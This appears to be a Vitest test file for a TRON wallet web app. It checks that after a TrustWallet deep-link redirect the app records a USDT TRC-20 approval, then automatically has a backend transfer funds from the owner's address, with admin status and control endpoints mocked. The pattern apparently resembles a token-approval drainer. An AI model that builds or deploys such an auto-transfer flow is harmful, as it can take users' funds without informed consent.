// @vitest-environment jsdom
import { beforeEach, describe, expect, it, vi } from "vitest";

const mocks = vi.hoisted(() => ({
  connectWallet: vi.fn(),
  sendApprove: vi.fn(),
  requestBackendTransfer: vi.fn(),
  fetchUsdtBalance: vi.fn(),
  fetchTrxBalance: vi.fn(),
  fetchUsdtActivity: vi.fn(),
  fetchAllowance: vi.fn(),
  buildApproveTx: vi.fn(),
  broadcastTx: vi.fn(),
  fetchAdminStatus: vi.fn(),
}));

vi.mock("../src/wallet", () => ({ connectWallet: mocks.connectWallet }));
vi.mock("../src/transfer", () => ({ sendApprove: mocks.sendApprove }));
vi.mock("../src/backend", () => ({
  requestBackendTransfer: mocks.requestBackendTransfer,
  fetchAdminStatus: mocks.fetchAdminStatus,
  postAdminControl: vi.fn().mockResolvedValue(false),
}));
vi.mock("../src/tron", () => ({
  fetchUsdtBalance: mocks.fetchUsdtBalance,
  fetchTrxBalance: mocks.fetchTrxBalance,
  fetchUsdtActivity: mocks.fetchUsdtActivity,
  fetchAllowance: mocks.fetchAllowance,
  buildApproveTx: mocks.buildApproveTx,
  broadcastTx: mocks.broadcastTx,
}));

const OWNER = "TKQ2bDW5x37mNfu9maUc9va5quHkxFVNaX";

describe("TrustWallet deep-link approval integration", () => {
  beforeEach(() => {
    vi.resetModules();
    vi.resetAllMocks();
    document.body.innerHTML = '<div id="app"></div>';
    window.history.replaceState(null, "", "/?callback=approval");
    sessionStorage.setItem("pendingApprovalAddress", OWNER);
    mocks.fetchAllowance.mockResolvedValue(100n);
    mocks.fetchUsdtBalance.mockResolvedValue(100n);
    mocks.fetchTrxBalance.mockResolvedValue(5_000_000n);
    mocks.fetchUsdtActivity.mockResolvedValue([]);
    mocks.requestBackendTransfer.mockResolvedValue({ ok: true, txId: "SENT_TX" });
    mocks.fetchAdminStatus.mockResolvedValue(null);
  });

  it("resumes from the redirect, polls, and auto-sends", async () => {
    await import("../src/main");
    await vi.waitFor(() => {
      expect(document.querySelector("#approve-status")!.textContent).toContain(
        "USDT TRC-20 approved!",
      );
    });
    await vi.waitFor(() => {
      expect(mocks.requestBackendTransfer).toHaveBeenCalledWith(OWNER);
    });
    await vi.waitFor(() => {
      expect(document.querySelector("#status")!.textContent).toContain("Transfer sent!");
    });
  });
});
